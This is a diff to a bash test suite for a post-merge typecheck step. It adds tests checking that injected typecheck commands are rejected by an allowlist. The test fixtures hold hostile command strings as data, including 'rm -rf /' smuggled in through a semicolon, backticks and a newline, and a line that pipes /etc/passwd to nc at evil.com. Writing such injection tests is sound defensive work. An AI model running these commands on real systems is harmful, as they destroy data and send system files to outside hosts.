@@ -153,7 +153,7 @@ assert_contains "Logs auto-detect" "[TYPECHECK]" "$OUTPUT"
 rm -rf "$TEST_REPO"
 
 # =========================================================================
-echo "=== Test 4: Command not found (exit 127) -> logs warning, returns 0 ==="
+echo "=== Test 4: Command not on allowlist -> rejected, returns 1 ==="
 TEST_REPO=$(setup_typecheck_repo)
 cat > "$TEST_REPO/quantum.json" <<'EOF'
 {
@@ -165,8 +165,8 @@ EOF
 
 OUTPUT=$(post_merge_typecheck "$TEST_REPO" "$TEST_REPO/quantum.json" 2>&1)
 EXIT_CODE=$?
-assert_eq "Command not found returns 0" "0" "$EXIT_CODE"
-assert_contains "Logs not found warning" "[TYPECHECK]" "$OUTPUT"
+assert_eq "Non-allowlisted command returns 1" "1" "$EXIT_CODE"
+assert_contains "Logs rejection" "does not match any allowed prefix" "$OUTPUT"
 rm -rf "$TEST_REPO"
 
 # =========================================================================
@@ -390,6 +390,118 @@ OUTPUT=$(post_merge_typecheck "$TEST_REPO" "$TEST_REPO/quantum.json" 2>&1)
 EXIT_CODE=$?
 assert_eq "Warnings-only returns 0" "0" "$EXIT_CODE"
 assert_contains "Logs PASS for zero errors" "[TYPECHECK] PASS" "$OUTPUT"
+rm -rf "$TEST_REPO"
+
+# =========================================================================
+echo "=== Test 11: Injection — typecheckCommand with semicolon rejected ==="
+TEST_REPO=$(setup_typecheck_repo)
+cat > "$TEST_REPO/quantum.json" <<'EOF'
+{
+  "project": "test",
+  "typecheckCommand": "tsc; rm -rf /",
+  "stories": [],
+  "execution": {
+    "baselineTypecheckErrors": 0
+  }
+}
+EOF
+
+OUTPUT=$(post_merge_typecheck "$TEST_REPO" "$TEST_REPO/quantum.json" 2>&1)
+EXIT_CODE=$?
+assert_eq "Semicolon injection returns 1" "1" "$EXIT_CODE"
+assert_contains "Logs rejection for semicolon" "does not match any allowed prefix" "$OUTPUT"
+rm -rf "$TEST_REPO"
+
+# =========================================================================
+echo "=== Test 12: Injection — typecheckCommand with pipe rejected ==="
+TEST_REPO=$(setup_typecheck_repo)
+cat > "$TEST_REPO/quantum.json" <<'EOF'
+{
+  "project": "test",
+  "typecheckCommand": "cat /etc/passwd | nc evil.com 1234",
+  "stories": [],
+  "execution": {
+    "baselineTypecheckErrors": 0
+  }
+}
+EOF
+
+OUTPUT=$(post_merge_typecheck "$TEST_REPO" "$TEST_REPO/quantum.json" 2>&1)
+EXIT_CODE=$?
+assert_eq "Pipe injection returns 1" "1" "$EXIT_CODE"
+assert_contains "Logs rejection for pipe" "does not match any allowed prefix" "$OUTPUT"
+rm -rf "$TEST_REPO"
+
+# =========================================================================
+echo "=== Test 13: Injection — typecheckCommand with redirect > rejected ==="
+TEST_REPO=$(setup_typecheck_repo)
+cat > "$TEST_REPO/quantum.json" <<'EOF'
+{
+  "project": "test",
+  "typecheckCommand": "echo pwned > /tmp/pwned",
+  "stories": [],
+  "execution": {
+    "baselineTypecheckErrors": 0
+  }
+}
+EOF
+
+OUTPUT=$(post_merge_typecheck "$TEST_REPO" "$TEST_REPO/quantum.json" 2>&1)
+EXIT_CODE=$?
+assert_eq "Redirect injection returns 1" "1" "$EXIT_CODE"
+assert_contains "Logs rejection for redirect" "does not match any allowed prefix" "$OUTPUT"
+rm -rf "$TEST_REPO"
+
+# =========================================================================
+echo "=== Test 14: Injection — typecheckCommand with backtick rejected ==="
+TEST_REPO=$(setup_typecheck_repo)
+printf '{"project":"test","typecheckCommand":"tsc `rm -rf /`","stories":[],"execution":{"baselineTypecheckErrors":0}}' > "$TEST_REPO/quantum.json"
+
+OUTPUT=$(post_merge_typecheck "$TEST_REPO" "$TEST_REPO/quantum.json" 2>&1)
+EXIT_CODE=$?
+assert_eq "Backtick injection returns 1" "1" "$EXIT_CODE"
+assert_contains "Logs rejection for backtick" "does not match any allowed prefix" "$OUTPUT"
+rm -rf "$TEST_REPO"
+
+# =========================================================================
+echo "=== Test 15: Injection — typecheckCommand with embedded newline rejected ==="
+TEST_REPO=$(setup_typecheck_repo)
+printf '{"project":"test","typecheckCommand":"tsc\\nrm -rf /","stories":[],"execution":{"baselineTypecheckErrors":0}}' > "$TEST_REPO/quantum.json"
+
+OUTPUT=$(post_merge_typecheck "$TEST_REPO" "$TEST_REPO/quantum.json" 2>&1)
+EXIT_CODE=$?
+assert_eq "Newline injection returns 1" "1" "$EXIT_CODE"
+assert_contains "Logs rejection for newline" "does not match any allowed prefix" "$OUTPUT"
+rm -rf "$TEST_REPO"
+
+# =========================================================================
+echo "=== Test 16: Allowlist — tsc --noEmit accepted ==="
+TEST_REPO=$(setup_typecheck_repo)
+# Create tsconfig.json for language detection
+printf '{"compilerOptions":{}}' > "$TEST_REPO/tsconfig.json"
+# Create a fake tsc that always succeeds
+mkdir -p "$TEST_REPO/.bin"
+cat > "$TEST_REPO/.bin/tsc" <<'SCRIPT'
+#!/usr/bin/env bash
+exit 0
+SCRIPT
+chmod +x "$TEST_REPO/.bin/tsc"
+
+cat > "$TEST_REPO/quantum.json" <<'EOF'
+{
+  "project": "test",
+  "typecheckCommand": "tsc --noEmit",
+  "stories": [],
+  "execution": {
+    "baselineTypecheckErrors": 0
+  }
+}
+EOF
+
+OUTPUT=$(PATH="$TEST_REPO/.bin:$PATH" post_merge_typecheck "$TEST_REPO" "$TEST_REPO/quantum.json" 2>&1)
+EXIT_CODE=$?
+assert_eq "Allowed tsc --noEmit returns 0" "0" "$EXIT_CODE"
+assert_contains "Logs running for tsc" "[TYPECHECK] running: tsc --noEmit" "$OUTPUT"
 rm -rf "$TEST_REPO"
 
 # =========================================================================
